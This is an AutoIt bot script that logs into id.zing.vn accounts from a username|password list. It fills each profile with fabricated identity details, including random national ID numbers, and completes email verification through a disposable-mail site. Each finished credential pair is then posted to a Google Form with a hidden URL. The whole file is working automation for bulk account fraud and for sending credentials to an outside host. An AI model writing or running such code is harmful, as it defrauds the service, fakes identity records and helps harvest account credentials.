
#NoTrayIcon
#Region ;**** Directives created by AutoIt3Wrapper_GUI ****
#AutoIt3Wrapper_Res_Fileversion=0.0.0.0
#AutoIt3Wrapper_Res_Fileversion_AutoIncrement=y
#AutoIt3Wrapper_Res_LegalCopyright=@ 2013
#AutoIt3Wrapper_Res_Language=1066
#EndRegion ;**** Directives created by AutoIt3Wrapper_GUI ****

#include <ButtonConstants.au3>
#include <GUIConstantsEx.au3>
#include <GUIListBox.au3>
#include <StaticConstants.au3>
#include <WindowsConstants.au3>
#include <Timers.au3>
#include <SliderConstants.au3>
#include <Misc.au3>
#include <File.au3>
#include <Array.au3>
#include <IE.au3>
#include <File.au3>

HotKeySet('{home}', 'dung')
HotKeySet('{ESC}', '__exit')
HotKeySet('^{enter}', '__hidegui')
#Region ### START Koda GUI section ### Form=

Local $random,$oForm,$omatkhau1,$omatkhau2,$input,$check,$random
Local $random2,$oForm2,$omatkhau12,$omatkhau22,$input2,$check2,$ohoten,$dulieudiachi,$diachi,$chuatoi
$chuatoi=0
;----------------------------------------
Func _num()
   $filez = FileOpen("num.txt", 0)
   Global $i = FileRead($filez)
   FileClose($filez)
EndFunc
;----------------------------------------

;-----------------------------------------
$dulieuzing = FileOpen("1000.txt", 0)
$dulieumail = FileOpen("mail.txt", 0)
$usernamemail = FileReadLine($dulieumail,1)
FileClose($dulieumail)
$usernamemail = StringSplit($usernamemail,",")
;$password = "nhocquan"
$dulieuten = FileOpen("ten.txt", 0)
$ten = FileReadLine($dulieuten,1)
FileClose($dulieuten)
$ten = StringSplit($ten,",")

$dulieudiachi = FileOpen("diachi.txt", 0)
$diachi = FileReadLine($dulieudiachi,1)
FileClose($dulieudiachi)
$diachi = StringSplit($diachi,"*")
;------------------------------------------

;----------------------------------------
$Form1 = GUICreate("Auto Register LTBVN.Net - Code by Tommie", @DesktopWidth-245, 700, 1, 1,$WS_OVERLAPPEDWINDOW + $WS_VISIBLE + $WS_CLIPSIBLINGS + $WS_CLIPCHILDREN)
GUISetState(@SW_SHOW)
;----------------------------------------

Local $oIE = _IECreateEmbedded(); $oIE Embedded
GUICtrlCreateObj($oIE, 10, 40, 540, 768)
_IENavigate($oIE, "https://id.zing.vn/login/index.38.html")
_IELoadWait($oIE)

Local $oIE2 = _IECreateEmbedded(); $oIE Embedded
	GUICtrlCreateObj($oIE2, 570, 40, 540, 768)
_IENavigate($oIE2, "http://www.fakemailgenerator.com/")
_IELoadWait($oIE2)
;---------------------------------------------------------
$i = 1
$oHTTP = ObjCreate("winhttp.winhttprequest.5.1")
$oHTTP.Open("POST", "https://docs.google.com/forms/d/SORRY I HIDE MY URL/formResponse")
$oHTTP.SetRequestHeader("Content-Type", "application/x-www-form-urlencoded")

While 1
   _num()
   
   $random = Int(Random(10,900))
   _IENavigate($oIE2, "http://www.fakemailgenerator.com/?u="&$usernamemail[$random]&"&d=dayrep.com")
   
   
   _IENavigate($oIE, "https://id.zing.vn/login/index.38.html")
   $usernamezing = FileReadLine($dulieuzing,$i)
   $usernamezing = StringSplit($usernamezing,"|")
   $oForm=_IEGetObjById($oIE,'form1')
   $otendangnhap =_IEFormElementGetObjByName($oForm,'u')
   _IEFormElementSetValue($otendangnhap,$usernamezing[1])
   $omatkhau1=_IEFormElementGetObjByName($oForm,'p')
   _IEFormElementSetValue($omatkhau1,$usernamezing[2])
   _IEFormImageClick($oForm, "btn_dangky.gif", "src")
	  
	  
	  If _IEPropertyGet($oIE, "locationurl") = "https://id.zing.vn/updateaccount/index.38.html" then
		 $oForm=_IEGetObjById($oIE,'frmRegister')
		 ;H? và tên
		 $ohoten =_IEFormElementGetObjByName($oForm,'hoten')
		 _IEFormElementSetValue($ohoten,$ten[$i])
		 ;Ð?a ch?
		 $odiachi=_IEFormElementGetObjByName($oForm,'diachi')
		 _IEFormElementSetValue($odiachi,$diachi[$i])
		 ;CMND
		 $opersonalid=_IEFormElementGetObjByName($oForm,'personalid')
		 _IEFormElementSetValue($opersonalid,"02"&Random(1212121,9898989,1))
		 ;Mail ti?n t?
		 $oemail_name=_IEFormElementGetObjByName($oForm,'email_name')
		 _IEFormElementSetValue($oemail_name,$usernamemail[$random])
		 ;Mail h?u t?
		 $oemail_domain_txt=_IEFormElementGetObjByName($oForm,'email_domain_txt')
		 _IEFormElementSetValue($oemail_domain_txt,"dayrep.com")
		 _IEFormElementRadioSelect($oForm, Random(0,1.4,1), "sSex", 1, "byValue")
		 _IEFormElementRadioSelect($oForm, Random(0,1.4,1), "maritalstatus", 1, "byValue")
		 ;Ngày - tháng - nam sinh
		 $odName = _IEFormElementGetObjByName($oForm, "dName")
		 _IEFormElementOptionSelect($odName, Random(1,28,1), 1, "byValue")
		 $omName = _IEFormElementGetObjByName($oForm, "mName")
		 _IEFormElementOptionSelect($omName, Random(1,12,1), 1, "byValue")
		 $oyName = _IEFormElementGetObjByName($oForm, "yName")
		 _IEFormElementOptionSelect($oyName, Random(1980,2000,1), 1, "byValue")
		 ;thành ph?
		 $oadd = _IEFormElementGetObjByName($oForm, "add")
		 _IEFormElementOptionSelect($oadd, Random(1,65,1), 1, "byValue")
		 ;công vi?c
		 $ojob = _IEFormElementGetObjByName($oForm, "job")
		 _IEFormElementOptionSelect($ojob, Random(1,8,1), 1, "byValue")
		 ;ngày - tháng - nam CMND
		 $od_cmnd = _IEFormElementGetObjByName($oForm, "d_cmnd")
		 _IEFormElementOptionSelect($od_cmnd, Random(1,28,1), 1, "byValue")
		 $om_cmnd = _IEFormElementGetObjByName($oForm, "m_cmnd")
		 _IEFormElementOptionSelect($om_cmnd, Random(1,12,1), 1, "byValue")
		 $oy_cmnd = _IEFormElementGetObjByName($oForm, "y_cmnd")
		 _IEFormElementOptionSelect($oy_cmnd, Random(1980,2000,1), 1, "byValue")
		 ;noi c?p CMND
		 $oregionissue = _IEFormElementGetObjByName($oForm, "regionissue")
		 _IEFormElementOptionSelect($oregionissue, Random(1,65,1), 1, "byValue")
		 ;ch?n mail h?u t?
		 $oemail_domain = _IEFormElementGetObjByName($oForm, "email_domain")
		 _IEFormElementOptionSelect($oemail_domain, "-1", 1, "byValue")
		 _IEFormSubmit($oForm)
	  Sleep(3000)
	  
	  
		 while $chuatoi <> 10
			If _IEPropertyGet ($oIE2, "locationURL") = "http://www.fakemailgenerator.com/inbox//"&$usernamemail[$random]&"/" then
			   _IENavigate($oIE2, "http://www.fakemailgenerator.com/inbox/dayrep.com/"&$usernamemail[$random]&"/")
			   $oFrame2 = _IEFrameGetCollection($oIE2, 0)
			   _IENavigate($oIE2, _IEPropertyGet($oFrame2, "locationurl"))
			   _IELinkClickByIndex($oIE2, 1)
						$chuatoi = 10
			   _FileWriteToLine("hoantat.txt", 1, $usernamezing[1]&"|"&$usernamezing[2], 0)
			   $oHTTP.Send("entry.1096575947="&$usernamezing[1]&"|"&$usernamezing[2]&"|"&($i+1)&"&draftResponse=%5B%5D%0D%0A&pageHistory=0")
			Else
			   sleep(1000)
			   $chuatoi = $chuatoi + 1
			EndIf
		 WEnd
		 $chuatoi = 0
	

	;	 _FileWriteToLine("thanhcong.txt", 1, $username[1]&"|"&$username[2], 0)
	;		FileCopy("thanhcong.txt", "thanhcongluutru.txt",1)
	  EndIf
   ;K?t thúc phiên, logout tài kho?n
   _IENavigate($oIE, "https://id.zing.vn/sso/logout.php")
	  



;   If _IEPropertyGet($oIE, "locationurl") = "https://id.zing.vn/home/index.38.success.html" then
;		 _FileWriteToLine("done.txt", 1, $username[$i]&"|"&$username[$random], 0)
 ;  EndIf
  ; _IENavigate($oIE, "https://id.zing.vn/sso/logout.php")
   ;_IENavigate($oIE, "https://id.zing.vn/register/index.38.html")
;   _IELoadWait($oIE)
;   _FileWriteToLine("num.txt", 1, $i+1, 1)
;   GUICtrlSetData($input, "")
;   ControlClick("", "", $input)
	  _FileWriteToLine("num.txt", 1, $i+1, 1)
WEnd

func __exit()
   Exit
EndFunc

func dung()
   $pause = not $pause
EndFunc